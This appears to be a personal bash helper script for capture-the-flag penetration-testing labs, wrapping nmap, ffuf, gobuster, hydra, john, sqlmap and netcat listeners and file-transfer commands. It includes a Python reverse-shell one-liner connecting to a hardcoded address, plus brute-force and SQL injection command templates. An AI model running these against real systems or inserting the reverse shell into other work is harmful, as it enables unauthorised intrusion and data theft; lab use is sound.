#!/bin/bash

fake_sshkey() {
    echo -e "\n ssh-keygen -t rsa -f fake.id_rsa -P '' ; cat fake.id_rsa.pub \n"

    default_fileName="fake"

    echo -n "Specify filename or press Enter to use default filename ($default_fileName): "

    read fileName

    if [ -z "$fileName" ]; then
        fileName=$default_fileName
    fi

    ssh-keygen -t rsa -f "${fileName}.id_rsa" -P ""

    echo -e " \n "

    cat "${fileName}.id_rsa.pub"
}



ffuf_command() {

    ls -lah /usr/share/wordlists

    echo -e "\n ffuf -u http://\$1 -w \"/usr/share/wordlists\" -c -v -t 50 -od . -of md -o ffuf-\$3.md \$* \n"
}



thm_ffuf() {

    ls -lah /usr/share/wordlists

    echo -n "Specify target (e.g., IP/FQDN): "
    read target

    echo -n "Specify output filename (e.g., IP/FQDN): "
    read filename

    echo -n "Specify wordlist: "
    read wordlist

    ffuf -u "http://$target" -w "$wordlist" -c -v -t 50 -od . -of md -o "${filename}.thm-ffuf.md"
}



ffuf_vhost_command() {

    ls -lah /usr/share/wordlists

    echo -e "\n ffuf -w \"/usr/share/wordlists\" -u http://forge.htb/ -H 'Host: FUZZ.forge.htb' -t 200 -fl 10 -c -od . -of md -o ffuf-vhost-forge.htb.md \n"
}



find_suid() {
    echo -e "\n find / -type f -perm -04000 -ls >> '$(whoami)-find-suid.txt' 2>/dev/null \n"
}



gobuster_command() {
    
    ls -lah /usr/share/wordlists

    echo -e "\n gobuster -t 45 --delay 100ms dir -e -u \"http://$one\" -o \"gobuster-dir-$two\" -w \"/usr/share/wordlists\" \n"
}



gobuster_dir() {
    
    ls -lah /usr/share/wordlists

    echo -n "Specify target (e.g., IP/FQDN): "
    read target

    echo -n "Specify output filename (e.g., IP/FQDN): "
    read filename

    echo -n "Specify wordlist: "
    read wordlist

    gobuster -t 45 --delay 100ms dir -e -u "http://$target" -o "$filename.gobuster-dir" -w "$wordlist"
}



hash_id() {
    echo -e "\n nth -a | ev -t | -f hash  ---OR--- hashid -ejm hash \n"
}



hydra_command() {
    echo " hydra -s port -o hydra-output -VV -t 60 -f -l lin -P locks.txt 10.10.155.24 ssh "
}



john_command() {
        
    ls -lah /usr/share/wordlists

    echo -e "\n john --format=NT -w rockyou.lst hash.txt --pot=output.txt \n"
}



john_result() {
    echo -e "\n john --show hash \n"
}



nc_recv() {
    echo -e "\n nc -nlvvp 9998 > \$* \n"
}



nc_send() {
    echo -e "\n nc -vv \$1 9998 < \$2 \$* \n"
}



nc17777() {
    arguments="-lnvvp 17777"
    nc ${arguments}
}



nc17778() {
    arguments="-lnvvp 17778"
    nc ${arguments}
}



nc18888() {
    arguments="-lnvvp 18888"
    nc ${arguments}
}



nc18889() {
    arguments="-lnvvp 18889"
    nc ${arguments}
}



nc19998recv() {
    port=19998

    echo -n "Enter the targeted filename: "
    read fileName

    nc -w 30 -nlvvp $port > $fileName
}



nc19998send() {
    port=19998

    echo -n "Specify target (e.g., IP/FQDN): "
    read target_IP

    echo -n "Enter the source filename: "
    read fileName

    cat ${fileName} | nc -w 30 -vv ${target_IP} ${port}
}



nc19999recv() {
    port=19999

    echo -n "Enter the targeted filename: "
    read fileName

    nc -w 30 -nlvvp $port > $fileName
}



nc19999send() {
    port=19999

    echo -n "Specify target (e.g., IP/FQDN): "
    read target_IP
    
    echo -n "Enter the source filename: "
    read fileName

    cat $fileName | nc -w 30 -vv $target_IP $port
}



new_sshkey() {
    
    echo -n "Enter the source filename: "
    read fileName

    ssh-keygen -o -v -t ed25519 -a 1000 -f "${fileName}.id_rsa" -P ""
}



nikto_command() {
    echo -e "\n nikto -h devzat.htb -p 80 -o nikto-result-devzat.htb -Format txt -Display V \n"
}



nmap_output() {
    echo -e "\n -oN nmap-full-safe-scan-\$1 \$2 \$* \n"
}



nmap_fast_3000() {
    
    echo -n "Specify target (e.g., IP/FQDN): "
    read target
    
    echo -n "Specify output filename (e.g., IP/FQDN): "
    read filename

    sudo nmap -n --stats-every 25s -vvvvvv -Pn -F --top-ports 3000 -r -sV -O --version-light -T4 --min-parallelism 30 --min-rate 300 --reason --append-output -oN "${filename}.nmap-fast-3000" $target
}



nmap_fast_port() {
    
    echo -n "Specify target (e.g., IP/FQDN): "
    read target
    
    echo -n "Specify output filename (e.g., IP/FQDN): "
    read filename

    sudo nmap -n --stats-every 25s -vvvvvv -Pn -p- -r -sV -O --version-light -T4 --min-parallelism 30 --min-rate 300 --reason --append-output -oN "${filename}.nmap-fast-port" $target
}



nmap_full_max() {
    
    echo -n "Specify target (e.g., IP/FQDN): "
    read target
    
    echo -n "Specify output filename (e.g., IP/FQDN): "
    read filename

    sudo nmap -n --stats-every 15s -vvvvvv -Pn -p- -r -A -sCSV -O --version-all -T4 --max-parallelism 30 --max-rate 300 --reason --script=safe,default,discovery,version,vuln --append-output -oN "${filename}.nmap-full-max" $target
}



nmap_full_min() {
    
    echo -n "Specify target (e.g., IP/FQDN): "
    read target
    
    echo -n "Specify output filename (e.g., IP/FQDN): "
    read filename

    sudo nmap -n --stats-every 15s -vvvvvv -Pn -p- -r -A -sCSV -O --version-all -T4 --min-parallelism 30 --min-rate 300 --reason --script=safe,default,discovery,version,vuln --append-output -oN "${filename}.nmap-full-min" $target
}



nmap_full_no_script() {
    
    echo -n "Specify target (e.g., IP/FQDN): "
    read target
    
    echo -n "Specify output filename (e.g., IP/FQDN): "
    read filename

    sudo nmap -n --stats-every 15s -vvvvvv -Pn -p- -r -A -sCSV -O --version-all -T4 --min-parallelism 30 --min-rate 300 --reason --append-output -oN "${filename}.nmap-full-no-script" $target
}



nmap_open() {
    
    echo -n "Specify target (e.g., IP/FQDN): "
    read target
    
    echo -n "Specify output filename (e.g., IP/FQDN): "
    read filename

    sudo nmap -n --stats-every 15s -vvvvvv -Pn -p- -r -open --append-output -oN "${filename}.nmap-open" $target
}



nmap_ping() {
    
    echo -n "Specify target (e.g., IP/FQDN): "
    read target
    
    echo -n "Specify output filename (e.g., IP/FQDN): "
    read filename

    sudo nmap -n --stats-every 15s -vvvvvv -sn --append-output -oN "${filename}.nmap-ping" $target
}



password_list() {
    ls -lah /usr/share/wordlists
}



python_web() {
    echo -n "Enter the port: "
    read Port
    python3 -m http.server $Port
}



python3_reverse_shell() {
    echo -e "\n /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.4.2.85\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' \n"
}



readme() {
    code -n ./README.md
}



rustscan_command() {
  echo -e "\n rustscan -u 5000 -b 1900 -t 4000 --tries 2 --scan-order serial -a 192.168.0.1 -- -Pn -A -sVC --script=safe,default,discovery,version,vuln | tee rustscan-full-result-NAME \n"
}



rustscan_simple() {
  echo -e "\n rustscan -u 5000 -b 1900 -t 4000 --tries 2 --scan-order serial -a 10.10.32.200 -- -Pn -sV --script=version | tee rustscan-simple-result-NAME \n"
}



sqlmap_command() {
  echo -e "\n sqlmap -u http://10.10.166.239/login.php --forms --data=\"user=^&password=^&s=Submit\" --risk=3 --level=5 --dbs --method POST -o --batch -v 1 --eta --threads=10 --schema --exclude-sysdbs \n"
}



sshkey_remove() {
    echo -n "Enter the IP/Hostname to be removed: "
    read STRINGS
    ssh-keygen -R $STRINGS
}



wget_command() {
    echo -e "\n wget -r -np -R \"index.html*\" WEB_PATH \n"
}



wget_recursive() {
    echo -n "Enter the URL: "
    read STRINGS
    wget -r -np -R "index.html*" $STRINGS
}



wordlist() {
    ls -lah /usr/share/wordlists
}

# You can add more functions as needed

